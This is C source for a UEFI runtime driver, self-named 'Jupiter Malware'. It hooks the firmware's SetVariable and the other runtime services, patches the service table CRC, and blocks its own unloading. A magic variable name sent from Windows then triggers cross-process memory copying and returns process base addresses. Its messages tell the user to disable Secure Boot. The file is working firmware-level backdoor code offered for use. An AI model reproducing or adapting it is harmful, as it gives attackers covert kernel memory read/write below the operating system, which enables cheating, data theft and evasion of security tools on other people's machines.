#define GNU_EFI_USE_MS_ABI 1
#define MicrosoftCallingType __attribute__((ms_abi))

#include <efi.h>
#include <efilib.h>
#include "dummy.h"

// Defines used to check if call is really coming from client
#define baseOperation 0x6256
#define VARIABLE_NAME L"keRdjvbgC"

//This is only to modify every command/magic key with only 1 def and don't need to go everywhere, the compiler will automatically parse the operation to number
#define COMMAND_MAGIC baseOperation*0x7346


// Dummy protocol struct
typedef struct _DummyProtocalData{
	UINTN blank;
} DummyProtocalData;

typedef unsigned long long ptr64;

// Struct containing data used to communicate with the client
typedef struct _MemoryCommand 
{
	int magic;
	int operation;
	ptr64 data[10];
} MemoryCommand;

// Functions (Windows only)
typedef int (MicrosoftCallingType *PsLookupProcessByProcessId)(
	void* ProcessId,
	void* OutPEProcess
);
typedef void* (MicrosoftCallingType *PsGetProcessSectionBaseAddress)(
	void* PEProcess
);
typedef int (MicrosoftCallingType *MmCopyvirtMemory)(
	void* SourceProcess,
	void* SourceAddress,
	void* TargetProcess,
	void* TargetAddress,
	ptr64 BufferSize,
	char PreviousMode,
	void* ReturnSize
);

// Our protocol GUID (should be different for every driver)
static const EFI_GUID protocolg
	= { 0x2f84893e, 0xfd5e, 0x2038, {0x8d, 0x9e, 0x20, 0xa7, 0xaf, 0x9c, 0x32, 0xf1} };

// virtAddressMap GUID (gEfiEventvirtAddressChangeGuid)
static const EFI_GUID virtg
	= { 0x13FA7698, 0xC831, 0x49C7, { 0x87, 0xEA, 0x8F, 0x43, 0xFC, 0xC2, 0x51, 0x96 }}; //we will remove later shouldn't be important

// ExitBootServices GUID (gEfiEventExitBootServicesGuid)
static const EFI_GUID exitg
	= { 0x27ABF055, 0xB1B8, 0x4C26, { 0x80, 0x48, 0x74, 0x8F, 0x37, 0xBA, 0xA2, 0xDF }}; //we will remove later shouldn't be important

// Pointers to original functions
static EFI_SET_VARIABLE setvaro = NULL;

// Global declarations
static EFI_EVENT notify = NULL;
static EFI_EVENT exite = NULL;
static BOOLEAN virt = FALSE;
static BOOLEAN rt = FALSE;

static PsLookupProcessByProcessId GetProcessByPid = (PsLookupProcessByProcessId)0;
static PsGetProcessSectionBaseAddress GetBaseAddress = (PsGetProcessSectionBaseAddress)0;
static MmCopyvirtMemory MCopyvirtMemory = (MmCopyvirtMemory)0;

// Function that actually performs the r/w
EFI_STATUS
RunCommand(MemoryCommand* cmd) 
{
	// Check if the command has right magic
	// (just to be sure again)
	if (cmd->magic != COMMAND_MAGIC) 
	{
		return EFI_ACCESS_DENIED;
	}

	// Copy operation
	if (cmd->operation == baseOperation * 0x823) 
	{
		void* src_process_id = (void*)cmd->data[0];
		void* src_address = (void*)cmd->data[1];
		void* dest_process_id = (void*)cmd->data[2];
		void* dest_address = (void*)cmd->data[3];
		ptr64 size = cmd->data[4];
		void* resultAddr = (void*)cmd->data[5];
		
		if (src_process_id == (void*)4ULL){
			// Same as memcpy function
			CopyMem(dest_address, src_address, size);
		}
		else{
			void* SrcProc = 0;
			void* DstProc = 0;
			ptr64 size_out = 0;
			int status = 0;
			
			status = GetProcessByPid(src_process_id, &SrcProc);
			if (status < 0){
				*(ptr64*)resultAddr = status;
				return EFI_SUCCESS;
			}
			
			status = GetProcessByPid(dest_process_id, &DstProc);
			if (status < 0){
				*(ptr64*)resultAddr = status;
				return EFI_SUCCESS;
			}
				
			
			*(ptr64*)resultAddr = MCopyvirtMemory(SrcProc, src_address, DstProc, dest_address, size, 1, &size_out);
		}
		return EFI_SUCCESS;
	}
	
	if (cmd->operation == baseOperation * 0x612) 
	{
		GetProcessByPid = (PsLookupProcessByProcessId)cmd->data[0];
		GetBaseAddress = (PsGetProcessSectionBaseAddress)cmd->data[1];
		MCopyvirtMemory = (MmCopyvirtMemory)cmd->data[2];
		ptr64 resultAddr = cmd->data[3];
		*(ptr64*)resultAddr = 1;
		return EFI_SUCCESS;
	}
	
	//Get Process Base Address
	if (cmd->operation == baseOperation * 0x289) 
	{
		void* pid = (void*)cmd->data[0];
		void* resultAddr = (void*)cmd->data[1];
		void* ProcessPtr = 0;
		
		//Find process by ID
		if (GetProcessByPid(pid, &ProcessPtr) < 0 || ProcessPtr == 0) {
			*(ptr64*)resultAddr = 0; // Process not found
			return EFI_SUCCESS;
		}
		
		//Find process Base Address
		*(ptr64*)resultAddr = (ptr64)GetBaseAddress(ProcessPtr); //Return Base Address
		return EFI_SUCCESS;
	}

	// Invalid command
	return EFI_UNSUPPORTED;
}

// Hooked EFI function SetVariable()
// Can be called from Windows with NtSetSystemEnvironmentValueEx
EFI_STATUS
EFIAPI
HookedSetVariable(
	IN CHAR16 *VariableName,
	IN EFI_GUID *VendorGuid,
	IN UINT32 Attributes,
	IN UINTN DataSize,
	IN VOID *Data
	  ) 
{
	// Use our hook only after we are in virt address-space
	if (virt && rt) 
	{       
		// Check of input is not null
		if (VariableName != NULL && VariableName[0] != CHAR_NULL && VendorGuid != NULL) 
		{                     
			// Check if variable name is same as our declared one
			// this is used to check if call is really from our program
			// running in the OS (client)
			if (StrnCmp(VariableName, VARIABLE_NAME, 
				(sizeof(VARIABLE_NAME) / sizeof(CHAR16)) - 1) == 0) 
			{              
				if (DataSize == 0 && Data == NULL)
				{
					// Skip no data
					return EFI_SUCCESS;
				}

				// Check if the data size is correct
				if (DataSize == sizeof(MemoryCommand)) 
				{
					// We did it!
					// Now we can call the magic function
					return RunCommand((MemoryCommand*)Data);
				}
			}
		}
	}
	
	// Call the original SetVariable() function
	return setvaro(VariableName, VendorGuid, Attributes, DataSize, Data);
}

// Event callback when SetVitualAddressMap() is called by OS
VOID
EFIAPI
SetvirtAddressMapEvent(
	IN EFI_EVENT Event,
	IN VOID* Context
	)
{  
	// Convert orignal SetVariable address
	RT->ConvertPointer(0, &setvaro);

	// Convert all other addresses
	RT->ConvertPointer(0, &oGetTime);
	RT->ConvertPointer(0, &oSetTime);
	RT->ConvertPointer(0, &oGetWakeupTime);
	RT->ConvertPointer(0, &oSetWakeupTime);
	RT->ConvertPointer(0, &oSetvirtAddressMap);
	RT->ConvertPointer(0, &oConvertPointer);
	RT->ConvertPointer(0, &oGetVariable);
	RT->ConvertPointer(0, &oGetNextVariableName);
	//RT->ConvertPointer(0, &setvaro);
	RT->ConvertPointer(0, &oGetNextHighMonotonicCount);
	RT->ConvertPointer(0, &oResetSystem);
	RT->ConvertPointer(0, &oUpdateCapsule);
	RT->ConvertPointer(0, &oQueryCapsuleCapabilities);
	RT->ConvertPointer(0, &oQueryVariableInfo);
	
	// Convert rt services pointer
	RtLibEnablevirtMappings();

	// Null and close the event so it does not get called again
	notify = NULL;

	// We are now working in virt address-space
	virt = TRUE;
}

// Event callback after boot process is started
VOID
EFIAPI
ExitBootServicesEvent(
	IN EFI_EVENT Event,
	IN VOID* Context
	)
{
	// This event is called only once so close it
	BS->CloseEvent(exite);
	exite = NULL;

	// Boot services are now not avaible
	BS = NULL;
	
	// We are booting the OS now
	rt = TRUE;

	// Print some text so we know it works (300iq)
	ST->ConOut->SetAttribute(ST->ConOut, EFI_WHITE | EFI_BACKGROUND_RED);
	ST->ConOut->ClearScreen(ST->ConOut);
	Print(L"**Jupiter Malware Loaded, Remove your USB now** \n");
}

// Replaces service table pointer with desired one
// returns original
VOID*
SetServicePointer(
	IN OUT EFI_TABLE_HEADER *ServiceTableHeader,
	IN OUT VOID **ServiceTableFunction,
	IN VOID *NewFunction
	)
{
	// We don't want to fuck up the system
	if (ServiceTableFunction == NULL || NewFunction == NULL)
		return NULL;

	// Make sure boot services pointers are not null
	ASSERT(BS != NULL);
	ASSERT(BS->CalculateCrc32 != NULL);

	// Raise task priority level
	CONST EFI_TPL Tpl = BS->RaiseTPL(TPL_HIGH_LEVEL);

	// Swap the pointers
	// GNU-EFI and InterlockedCompareExchangePointer 
	// are not friends
	VOID* OriginalFunction = *ServiceTableFunction;
	*ServiceTableFunction = NewFunction;

	// Change the table CRC32 signature
	ServiceTableHeader->CRC32 = 0;
	BS->CalculateCrc32((UINT8*)ServiceTableHeader, ServiceTableHeader->HeaderSize, &ServiceTableHeader->CRC32);

	// Restore task priority level
	BS->RestoreTPL(Tpl);

	return OriginalFunction;
}

// EFI driver unload routine
static
EFI_STATUS
EFI_FUNCTION
efi_unload(IN EFI_HANDLE ImageHandle)
{
	// We don't want our driver to be unloaded 
	// until complete reboot
	return EFI_ACCESS_DENIED;
}

// EFI entry point
EFI_STATUS
efi_main(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable) 
{
	// Initialize internal GNU-EFI functions
	InitializeLib(ImageHandle, SystemTable);

	// Get handle to this image
	EFI_LOADED_IMAGE *LoadedImage = NULL;
	EFI_STATUS status = BS->OpenProtocol(ImageHandle, &LoadedImageProtocol,
										(void**)&LoadedImage, ImageHandle,
										NULL, EFI_OPEN_PROTOCOL_GET_PROTOCOL);
	
	// Return if protocol failed to open
	if (EFI_ERROR(status)) 
	{
		Print(L"Can't open protocol: %d\n", status);
		return status;
	}

	// Install our protocol interface
	// This is needed to keep our driver loaded
	DummyProtocalData dummy = { 0 };
	status = LibInstallProtocolInterfaces(
	  &ImageHandle, &protocolg,
	  &dummy, NULL);
	  
	// Return if interface failed to register
	if (EFI_ERROR(status)) 
	{
		Print(L"Can't register interface: %d\n", status);
		return status;
	}

	// Set our image unload routine
	LoadedImage->Unload = (EFI_IMAGE_UNLOAD)efi_unload;

	// Create global event for virtAddressMap
	status = BS->CreateEventEx(EVT_NOTIFY_SIGNAL,
								TPL_NOTIFY,
								SetvirtAddressMapEvent,
								NULL,
								virtg,
								&notify);

	// Return if event create failed
	if (EFI_ERROR(status)) 
	{
		Print(L"Can't create event : %d\n", status);
		return status;
	}

	// Create global event for ExitBootServices
	status = BS->CreateEventEx(EVT_NOTIFY_SIGNAL,
								TPL_NOTIFY,
								ExitBootServicesEvent,
								NULL,
								exitg,
								&exite);

	// Return if event create failed (yet again)
	if (EFI_ERROR(status)) 
	{
		Print(L"Can't create event : %d\n", status);
		return status;
	}

	// Hook SetVariable (should not fail)
	setvaro = (EFI_SET_VARIABLE)SetServicePointer(&RT->Hdr, (VOID**)&RT->SetVariable, (VOID**)&HookedSetVariable);

	// Hook all the other rt services functions
	oGetTime = (EFI_GET_TIME)SetServicePointer(&RT->Hdr, (VOID**)&RT->GetTime, (VOID**)&HookedGetTime);
	oSetTime = (EFI_SET_TIME)SetServicePointer(&RT->Hdr, (VOID**)&RT->SetTime, (VOID**)&HookedSetTime);
	oGetWakeupTime = (EFI_SET_TIME)SetServicePointer(&RT->Hdr, (VOID**)&RT->GetWakeupTime, (VOID**)&HookedGetWakeupTime);
	oSetWakeupTime = (EFI_SET_WAKEUP_TIME)SetServicePointer(&RT->Hdr, (VOID**)&RT->SetWakeupTime, (VOID**)&HookedSetWakeupTime);
	oSetvirtAddressMap = (EFI_SET_virt_ADDRESS_MAP)SetServicePointer(&RT->Hdr, (VOID**)&RT->SetvirtAddressMap, (VOID**)&HookedSetvirtAddressMap);
	oConvertPointer = (EFI_CONVERT_POINTER)SetServicePointer(&RT->Hdr, (VOID**)&RT->ConvertPointer, (VOID**)&HookedConvertPointer);
	oGetVariable = (EFI_GET_VARIABLE)SetServicePointer(&RT->Hdr, (VOID**)&RT->GetVariable, (VOID**)&HookedGetVariable);
	oGetNextVariableName = (EFI_GET_NEXT_VARIABLE_NAME)SetServicePointer(&RT->Hdr, (VOID**)&RT->GetNextVariableName, (VOID**)&HookedGetNextVariableName);
	//setvaro = (EFI_SET_VARIABLE)SetServicePointer(&RT->Hdr, (VOID**)&RT->SetVariable, (VOID**)&HookedSetVariable);
	oGetNextHighMonotonicCount = (EFI_GET_NEXT_HIGH_MONO_COUNT)SetServicePointer(&RT->Hdr, (VOID**)&RT->GetNextHighMonotonicCount, (VOID**)&HookedGetNextHighMonotonicCount);
	oResetSystem = (EFI_RESET_SYSTEM)SetServicePointer(&RT->Hdr, (VOID**)&RT->ResetSystem, (VOID**)&HookedResetSystem);
	oUpdateCapsule = (EFI_UPDATE_CAPSULE)SetServicePointer(&RT->Hdr, (VOID**)&RT->UpdateCapsule, (VOID**)&HookedUpdateCapsule);
	oQueryCapsuleCapabilities = (EFI_QUERY_CAPSULE_CAPABILITIES)SetServicePointer(&RT->Hdr, (VOID**)&RT->QueryCapsuleCapabilities, (VOID**)&HookedQueryCapsuleCapabilities);
	oQueryVariableInfo = (EFI_QUERY_VARIABLE_INFO)SetServicePointer(&RT->Hdr, (VOID**)&RT->QueryVariableInfo, (VOID**)&HookedQueryVariableInfo);

	// Print confirmation text
	Print(L"Jupiter Loaded. If it doesn't work make sure secure boot is disabled!\n");
	Print(L"You can now exit...\n");
	return EFI_SUCCESS;
}
